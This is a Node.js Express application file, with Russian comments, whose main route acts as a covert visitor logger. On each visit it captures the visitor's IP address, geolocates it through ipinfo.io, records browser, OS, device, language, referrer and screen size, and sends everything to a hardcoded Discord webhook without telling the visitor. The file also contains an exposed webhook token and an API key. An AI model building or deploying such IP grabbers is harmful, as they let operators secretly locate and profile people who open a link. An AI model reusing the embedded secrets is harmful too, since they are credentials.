var createError = require('http-errors');
var express = require('express');
var path = require('path');
const axios = require('axios');
const useragent = require('user-agent');
var cookieParser = require('cookie-parser');
var logger = require('morgan');
const UAParser = require('ua-parser-js');
const geoip = require('geoip-lite');
const geoAPIKey = '7b74e46d410c80';

var indexRouter = require('./routes/index');
var usersRouter = require('./routes/users');

var app = express();
const webhookURL = 'https://discord.com/api/webhooks/1303305688461873172/9DEy1uhctDg9Oev3ePHf8mlWCO9Ewc1CKunNH1Er8vlPioaEOddry23NNVcTGuwkdwyh';


app.set('views', path.join(__dirname, 'views'));
app.set('view engine', 'ejs');

app.get('/', async (req, res) => {
  // Получаем IP пользователя
  const ip = req.headers['x-forwarded-for'] || req.ip || req.connection.remoteAddress;

  // Получаем геолокацию по IP с использованием ipinfo.io
  const geoResponse = await axios.get(`https://ipinfo.io/${ip}/json?token=${geoAPIKey}`);
  const geo = geoResponse.data;

  // Парсим User-Agent
  const parser = new UAParser(req.headers['user-agent']);
  const result = parser.getResult();
  const browser = result.browser.name || "Неизвестный браузер";
  const os = result.os.name || "Неизвестная ОС";
  const device = result.device.type || "Неизвестное устройство";

  // Получаем язык пользователя
  const language = req.headers['accept-language'].split(',')[0];

  // Получаем реферер
  const referrer = req.headers['referer'] || "Неизвестно";

  // Получаем экранное разрешение через GET параметры
  const screenWidth = req.query.screenWidth || "Неизвестное";
  const screenHeight = req.query.screenHeight || "Неизвестное";

  // Время захода
  const visitTime = new Date().toISOString();

  const message = `Новый заход на сайт:
  - IP: ${ip}
  - Геолокация: ${geo.city || 'Неизвестно'}, ${geo.country || 'Неизвестно'}
  - Браузер: ${browser}
  - Операционная система: ${os}
  - Устройство: ${device}
  - Язык: ${language}
  - Реферер: ${referrer}
  - Экранное разрешение: ${screenWidth}x${screenHeight}
  - Время захода: ${visitTime}`;

  try {
      await axios.post(webhookURL, { content: message });
      res.render('index'); // Рендерим index.ejs из папки views
  } catch (error) {
      console.error('Ошибка при отправке сообщения в Discord:', error);
      res.status(500).send('Ошибка сервера');
  }
});

app.use(logger('dev'));
app.use(express.json());
app.use(express.urlencoded({ extended: false }));
app.use(cookieParser());
app.use(express.static(path.join(__dirname, 'public')));

app.use('/', indexRouter);
app.use('/users', usersRouter);

// catch 404 and forward to error handler
app.use(function(req, res, next) {
  next(createError(404));
});

// error handler
app.use(function(err, req, res, next) {
  // set locals, only providing error in development
  res.locals.message = err.message;
  res.locals.error = req.app.get('env') === 'development' ? err : {};

  // render the error page
  res.status(err.status || 500);
  res.render('error');
});

module.exports = app;
